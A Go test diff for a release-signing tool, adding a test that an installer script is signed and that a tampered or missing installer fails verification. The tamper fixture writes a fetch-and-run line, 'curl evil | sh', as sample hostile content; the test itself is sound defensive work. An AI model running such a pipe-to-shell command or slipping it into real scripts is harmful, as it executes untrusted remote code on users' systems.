@@ -45,6 +45,53 @@ func writeDist(t *testing.T, dir string) {
 	if err := os.WriteFile(filepath.Join(dir, "SHA256SUMS"), []byte(manifest.String()), 0o600); err != nil {
 		t.Fatal(err)
 	}
+	if err := os.WriteFile(filepath.Join(dir, installerAsset), []byte("#!/usr/bin/env sh\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+}
+
+// The site publishes the installer from the release, so an unsigned or altered
+// script has to fail the release rather than reach an adopter.
+func TestProcessRequiresASignedInstaller(t *testing.T) {
+	t.Parallel()
+	publicKey, privateKey, err := ed25519.GenerateKey(nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	t.Run("installer is signed and verified", func(t *testing.T) {
+		t.Parallel()
+		dir := t.TempDir()
+		writeDist(t, dir)
+		if err := process(dir, privateKey, publicKey, false); err != nil {
+			t.Fatalf("sign: %v", err)
+		}
+		if _, err := os.Stat(filepath.Join(dir, installerAsset+".sig")); err != nil {
+			t.Fatalf("installer was not signed: %v", err)
+		}
+		if err := process(dir, privateKey, publicKey, true); err != nil {
+			t.Fatalf("verify: %v", err)
+		}
+		if err := os.WriteFile(filepath.Join(dir, installerAsset), []byte("#!/usr/bin/env sh\ncurl evil | sh\n"), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		if err := process(dir, privateKey, publicKey, true); err == nil {
+			t.Fatal("a swapped installer verified")
+		}
+	})
+
+	t.Run("missing installer fails the release", func(t *testing.T) {
+		t.Parallel()
+		dir := t.TempDir()
+		writeDist(t, dir)
+		if err := os.Remove(filepath.Join(dir, installerAsset)); err != nil {
+			t.Fatal(err)
+		}
+		err := process(dir, privateKey, publicKey, false)
+		if err == nil || !strings.Contains(err.Error(), installerAsset) {
+			t.Fatalf("missing installer error = %v", err)
+		}
+	})
 }
 
 func TestProcessSignsImageDigestsWhenPresent(t *testing.T) {
